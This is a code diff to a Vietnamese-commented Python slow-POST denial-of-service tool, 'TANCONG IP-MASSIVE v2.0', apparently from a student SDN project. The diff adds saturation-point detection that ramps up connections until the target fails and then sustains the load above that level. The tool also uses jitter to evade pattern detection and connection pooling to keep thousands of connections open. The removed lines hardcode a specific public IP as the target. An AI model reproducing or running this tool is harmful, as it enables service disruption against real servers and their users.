@@ -2,7 +2,7 @@
 """
 TANCONG IP-MASSIVE v2.0 - Adaptive & Resource-Optimized
 ========================================================
-
+source /home/tgf/Documents/DoAn_SDN/attack/venv/bin/activate
 Tối ưu hóa cho tấn công 20,000+ connections với:
 1. Adaptive Load - Tự động điều chỉnh batch size theo error rate
 2. Randomized Jitter - Thời gian ngẫu nhiên, tránh pattern
@@ -34,6 +34,7 @@ from dataclasses import dataclass, field
 from typing import List, Dict, Optional, Tuple
 from enum import Enum
 from collections import deque
+from load_config import get_target_config, get_attack_config, validate_config
 
 # =============================================================================
 # ADAPTIVE CONFIGURATION
@@ -99,6 +100,13 @@ class AdaptiveAttackConfig:
     error_rate_threshold: float = 0.10  # Nếu error >10%, giảm batch
     success_rate_target: float = 0.95   # Target 95% success
     
+    # SATURATION POINT DETECTION (Break-point Testing)
+    enable_saturation_detection: bool = True
+    ramp_up_step: int = 500            # Tăng 500 connections mỗi bước
+    ramp_up_interval: float = 5.0      # 5 giây giữa các bước
+    saturation_error_threshold: float = 0.30  # 30% error = bắt đầu saturation
+    saturation_buffer: float = 1.2     # Duy trì ở 120% ngưỡng saturation
+    
     # Payload
     requests_per_conn: int = 3
     post_content_length: int = 10000000
@@ -132,6 +140,12 @@ class AdaptiveMetrics:
     avg_response_time: float = 0.0
     error_rate_window: deque = field(default_factory=lambda: deque(maxlen=10))
     
+    # Saturation Point Detection
+    saturation_detected: bool = False
+    saturation_point: int = 0           # Ngưỡng tới hạn (connections)
+    maintenance_level: int = 0          # Mức duy trì (connections)
+    ramp_up_phase: bool = True          # Đang trong giai đoạn ramp-up
+    
     def update_error_rate(self, batch_errors: int, batch_total: int):
         """Cập nhật error rate cho adaptive batch sizing."""
         rate = batch_errors / max(batch_total, 1)
@@ -152,15 +166,15 @@ class AdaptiveMetrics:
         memory_percent = psutil.virtual_memory().percent
         
         print(f"\n{'='*70}")
-        print(f"🔥 MASSIVE v2.0 ADAPTIVE METRICS")
+        print(f"MASSIVE v2.0 ADAPTIVE METRICS")
         print(f"{'='*70}")
-        print(f"⏱️  Time: {elapsed:.1f}s ({elapsed/60:.1f}m)")
-        print(f"📊 Total: {self.total_attempts:,} | Success: {self.successful_attacks:,}")
-        print(f"🌐 TCP: {self.tcp_established:,} (Recycled: {self.tcp_recycled:,})")
-        print(f"📈 Success: {rate:.1f}% | Error: {error_rate:.1f}%")
-        print(f"⚙️  Batch: {self.current_batch_size} | Concurrency: {self.current_concurrency}")
-        print(f"💻 CPU: {cpu_percent:.1f}% | RAM: {memory_percent:.1f}%")
-        print(f"🌊 Batches: {self.batches_completed} | Bursts: {self.bursts_completed}")
+        print(f"Time: {elapsed:.1f}s ({elapsed/60:.1f}m)")
+        print(f"Total: {self.total_attempts:,} | Success: {self.successful_attacks:,}")
+        print(f"TCP: {self.tcp_established:,} (Recycled: {self.tcp_recycled:,})")
+        print(f"Success: {rate:.1f}% | Error: {error_rate:.1f}%")
+        print(f"Batch: {self.current_batch_size} | Concurrency: {self.current_concurrency}")
+        print(f"CPU: {cpu_percent:.1f}% | RAM: {memory_percent:.1f}%")
+        print(f"Batches: {self.batches_completed} | Bursts: {self.bursts_completed}")
         print(f"{'='*70}\n")
         
         return cpu_percent, memory_percent
@@ -187,7 +201,7 @@ class ConnectionPool:
         self.active_count = 0
         self.lock = asyncio.Lock()
     
-    async def get_connection(self, ip: str, port: int, ssl_ctx) -> Optional[Tuple]:
+    async def get_connection(self, ip: str, port: int, ssl_ctx, server_hostname: Optional[str] = None) -> Optional[Tuple]:
         """Lấy connection từ pool hoặc tạo mới."""
         try:
             # Thử lấy từ pool (timeout ngay)
@@ -203,7 +217,7 @@ class ConnectionPool:
         # Tạo connection mới
         try:
             reader, writer = await asyncio.wait_for(
-                asyncio.open_connection(ip, port, ssl=ssl_ctx),
+                asyncio.open_connection(ip, port, ssl=ssl_ctx, server_hostname=server_hostname),
                 timeout=5
             )
             METRICS.tcp_established += 1
@@ -276,7 +290,7 @@ class AdaptiveMassiveAttacker:
         memory = psutil.virtual_memory().percent
         if memory > self.config.memory_threshold_percent:
             gc.collect()
-            print(f"🧹 GC triggered (RAM: {memory:.1f}%)")
+            print(f" GC triggered (RAM: {memory:.1f}%)")
     
     async def _adaptive_batch_sizing(self, batch_success_rate: float):
         """Điều chỉnh batch size theo success rate."""
@@ -297,7 +311,40 @@ class AdaptiveMassiveAttacker:
         
         if old_size != self.current_batch_size:
             METRICS.current_batch_size = self.current_batch_size
-            print(f"⚙️  Adaptive batch: {old_size} → {self.current_batch_size}")
+            print(f" Adaptive batch: {old_size} → {self.current_batch_size}")
+    
+    async def _detect_saturation_point(self, batch_errors: int, batch_total: int):
+        """Detect saturation point dựa trên error rate."""
+        if not self.config.enable_saturation_detection:
+            return
+        
+        if METRICS.saturation_detected:
+            return  # Đã detect rồi
+        
+        error_rate = batch_errors / max(batch_total, 1)
+        
+        if error_rate > self.config.saturation_error_threshold:
+            # Đạt ngưỡng saturation
+            METRICS.saturation_detected = True
+            METRICS.saturation_point = METRICS.total_attempts
+            METRICS.maintenance_level = int(METRICS.saturation_point * self.config.saturation_buffer)
+            METRICS.ramp_up_phase = False
+            
+            print(f" SATURATION POINT DETECTED: {METRICS.saturation_point} connections")
+            print(f" Maintenance level: {METRICS.maintenance_level} connections")
+            print(f" Switching to maintenance phase...")
+    
+    async def _ramp_up_connections(self):
+        """Giai đoạn Ramp-up: Tăng dần connections để tìm saturation point."""
+        if not self.config.enable_saturation_detection:
+            return self.config.max_connections
+        
+        if not METRICS.ramp_up_phase:
+            return METRICS.maintenance_level
+        
+        # Tăng dần theo ramp_up_step
+        current_level = METRICS.total_attempts + self.config.ramp_up_step
+        return min(current_level, self.config.max_connections)
     
     async def attack_with_pool(self, conn_id: int) -> Tuple[bool, float]:
         """
@@ -310,9 +357,13 @@ class AdaptiveMassiveAttacker:
         
         try:
             async with self.semaphore:
-                # Lấy connection từ pool
-                conn = await self.connection_pool.get_connection(
-                    self.config.ip, self.config.port, self.ssl_ctx
+                # Lấy connection từ pool với timeout
+                conn = await asyncio.wait_for(
+                    self.connection_pool.get_connection(
+                        self.config.ip, self.config.port, self.ssl_ctx,
+                        server_hostname=self.config.hostname if self.config.use_ssl else None
+                    ),
+                    timeout=10.0  # 10s timeout cho connection
                 )
                 
                 if conn is None:
@@ -321,20 +372,29 @@ class AdaptiveMassiveAttacker:
                 reader, writer, is_recycled = conn
                 host = self.config.hostname or self.config.ip
                 
-                # Gửi requests
-                success_count = 0
+                # Gửi requests với timeout đủ dài để giữ kết nối slow POST trong duration
+                conn_success = False
                 for req_idx in range(self.config.requests_per_conn):
                     if SHUTDOWN.is_set():
                         break
                     
-                    if await self._send_slow_post(reader, writer, conn_id, req_idx, host):
-                        success_count += 1
-                        METRICS.successful_attacks += 1
+                    try:
+                        result = await asyncio.wait_for(
+                            self._send_slow_post(reader, writer, conn_id, req_idx, host),
+                            timeout=self.config.duration + 15.0
+                        )
+                        if result:
+                            conn_success = True
+                    except asyncio.TimeoutError:
+                        METRICS.timeouts += 1
+                        break  # Timeout, break loop
                     
                     if req_idx < self.config.requests_per_conn - 1:
                         await asyncio.sleep(0.1)
                 
-                success = success_count > 0
+                success = conn_success
+                if success:
+                    METRICS.successful_attacks += 1
                 
                 # Trả connection về pool để tái sử dụng
                 if self.config.enable_connection_pool:
@@ -349,6 +409,8 @@ class AdaptiveMassiveAttacker:
                     except:
                         pass
                     
+        except asyncio.TimeoutError:
+            METRICS.timeouts += 1
         except Exception as e:
             METRICS.errors += 1
             error_type = type(e).__name__
@@ -439,6 +501,9 @@ class AdaptiveMassiveAttacker:
         METRICS.batches_completed += 1
         METRICS.update_error_rate(errors, batch_size)
         
+        # Saturation point detection
+        await self._detect_saturation_point(errors, batch_size)
+        
         # Adaptive batch sizing
         success_rate = success / max(batch_size, 1)
         await self._adaptive_batch_sizing(success_rate)
@@ -446,22 +511,24 @@ class AdaptiveMassiveAttacker:
         return (success, errors)
     
     async def run_massive_attack(self):
-        """Chạy massive attack với burst-rest cycles."""
+        """Chạy massive attack với saturation detection."""
         total = self.config.max_connections
         batch = self.current_batch_size
         
-        print(f"\n🚀 MASSIVE v2.0 ADAPTIVE ATTACK")
+        print(f"\nMASSIVE v2.0 ADAPTIVE ATTACK")
         print(f"{'='*70}")
-        print(f"🎯 Target: {self.config.ip}:{self.config.port}{self.config.path}")
-        print(f"📊 Total: {total:,} connections")
-        print(f"📦 Initial batch: {batch} | Adaptive: ON")
-        print(f"⚡ Random jitter: {self.config.batch_delay_min}-{self.config.batch_delay_max}s")
-        print(f"💻 CPU throttle: {self.config.cpu_target_percent}%")
-        print(f"♻️  Connection pool: {self.config.connection_pool_size}")
-        print(f"🌊 Burst-rest: {self.config.burst_batches} batches / {self.config.rest_duration}s rest")
+        print(f"Target: {self.config.ip}:{self.config.port}{self.config.path}")
+        print(f"Total: {total:,} connections")
+        print(f"Initial batch: {batch} | Adaptive: ON")
+        print(f"Random jitter: {self.config.batch_delay_min}-{self.config.batch_delay_max}s")
+        print(f"CPU throttle: {self.config.cpu_target_percent}%")
+        print(f"Connection pool: {self.config.connection_pool_size}")
+        print(f"Burst-rest: {self.config.burst_batches} batches / {self.config.rest_duration}s rest")
+        if self.config.enable_saturation_detection:
+            print(f"Saturation Detection: ON (threshold: {self.config.saturation_error_threshold*100:.0f}%)")
         print(f"{'='*70}\n")
         
-        print("⚠️  Pre-flight:")
+        print(" Pre-flight:")
         print(f"   ulimit -n 65536 (file descriptors)")
         print(f"   RAM available: {psutil.virtual_memory().available / 1e9:.1f} GB")
         print()
@@ -471,8 +538,18 @@ class AdaptiveMassiveAttacker:
         batches_in_current_burst = 0
         
         while METRICS.total_attempts < total and not SHUTDOWN.is_set():
-            # Tính toán batch hiện tại
-            remaining = total - METRICS.total_attempts
+            # Tính toán batch hiện tại với saturation detection
+            if self.config.enable_saturation_detection:
+                target_connections = await self._ramp_up_connections()
+                remaining = target_connections - METRICS.total_attempts
+                if remaining <= 0 and METRICS.saturation_detected:
+                    # Đã đạt maintenance level, duy trì bằng cách reset counter
+                    # để tiếp tục attack với batch size hiện tại
+                    METRICS.total_attempts = 0  # Reset để tiếp tục
+                    remaining = self.current_batch_size
+            else:
+                remaining = total - METRICS.total_attempts
+            
             current_batch = min(self.current_batch_size, remaining)
             
             start_id = METRICS.total_attempts + 1
@@ -490,12 +567,12 @@ class AdaptiveMassiveAttacker:
                 progress = METRICS.total_attempts / total * 100
                 cpu = psutil.cpu_percent(interval=0.1)
                 mem = psutil.virtual_memory().percent
-                print(f"📊 {progress:.1f}% | {METRICS.total_attempts:,}/{total:,} | "
+                print(f"{progress:.1f}% | {METRICS.total_attempts:,}/{total:,} | "
                       f"CPU:{cpu:.0f}% | RAM:{mem:.0f}% | Batch:{self.current_batch_size}")
             
             # Burst-rest cycle
             if batches_in_current_burst >= self.config.burst_batches:
-                print(f"⏸️  Resting {self.config.rest_duration}s after burst...")
+                print(f"Resting {self.config.rest_duration}s after burst...")
                 METRICS.bursts_completed += 1
                 METRICS.rests_taken += 1
                 await asyncio.sleep(self.config.rest_duration)
@@ -518,7 +595,7 @@ class AdaptiveMassiveAttacker:
         
         elapsed = time.time() - start_time
         
-        print(f"\n✅ Attack Complete!")
+        print(f"\nAttack Complete!")
         print(f"   Total time: {elapsed/60:.1f} minutes")
         print(f"   Average batch: {METRICS.batches_completed / (elapsed/60):.1f} batches/min")
         print(f"   Effective attacks: {total_success * self.config.requests_per_conn:,}")
@@ -538,36 +615,39 @@ async def metrics_reporter():
 
 def signal_handler():
     SHUTDOWN.set()
-    print("\n\n⚠️  Graceful shutdown...")
+    print("\n\nGraceful shutdown...")
 
 
-async def main():
-    print("""
-    ╔════════════════════════════════════════════════════════════════╗
-    ║     TANCONG IP-MASSIVE v2.0 - Adaptive & Resource-Optimized   ║
-    ║                                                                  ║
-    ║  📊 Adaptive batch: 20-200 (auto-adjust)                         ║
-    ║  🎲 Random jitter: 50-150ms (natural pattern)                  ║
-    ║  💻 CPU throttle: <70% target                                    ║
-    ║  ♻️  Connection pool: 1000 TCP recycled                       ║
-    ║  🌊 Burst-rest: 50 batches + 2s rest                            ║
-    ╚════════════════════════════════════════════════════════════════╝
-    """)
-    
+async def main():    
     for sig in (signal.SIGINT, signal.SIGTERM):
         asyncio.get_event_loop().add_signal_handler(sig, signal_handler)
     
-    # ⚠️ CẤU HÌNH v2.0 - Tối ưu cho 20,000 connections
+    # LOAD CONFIG TỪ .env FILE
+    if not validate_config():
+        print("[!] Vui lòng cấu hình file .env trước khi chạy!")
+        sys.exit(1)
+    
+    target_config = get_target_config()
+    attack_config = get_attack_config()
+
+    if attack_config["chunk_interval"] > 0:
+        required_body = int(target_config["duration"] / attack_config["chunk_interval"]) * attack_config["chunk_size"]
+        if attack_config["post_content_length"] < required_body:
+            print(f"[!] Tự động điều chỉnh POST_CONTENT_LENGTH: {attack_config['post_content_length']} -> {required_body}")
+            print(f"    Đảm bảo body đủ lớn để giữ kết nối ít nhất {target_config['duration']}s")
+            attack_config["post_content_length"] = required_body
+    
+    # CẤU HÌNH v2.0 - Tối ưu cho 20,000 connections
     config = AdaptiveAttackConfig(
-        ip="101.96.125.79",
-        port=8000,
-        path="/",
-        use_ssl=False,
-        hostname=None,
+        ip=target_config["ip"],
+        port=target_config["port"],
+        path=target_config["path"],
+        use_ssl=target_config["use_ssl"],
+        hostname=target_config["hostname"],
         
         # Scale
-        max_connections=200,
-        duration=300,
+        max_connections=target_config["max_connections"],
+        duration=target_config["duration"],
         
         # ADAPTIVE BATCH
         initial_batch_size=100,
@@ -602,7 +682,10 @@ async def main():
         max_concurrency=8000,
         
         # PAYLOAD
-        requests_per_conn=3,
+        requests_per_conn=attack_config["requests_per_conn"],
+        post_content_length=attack_config["post_content_length"],
+        chunk_size=attack_config["chunk_size"],
+        chunk_interval=attack_config["chunk_interval"],
     )
     
     metrics_task = asyncio.create_task(metrics_reporter())
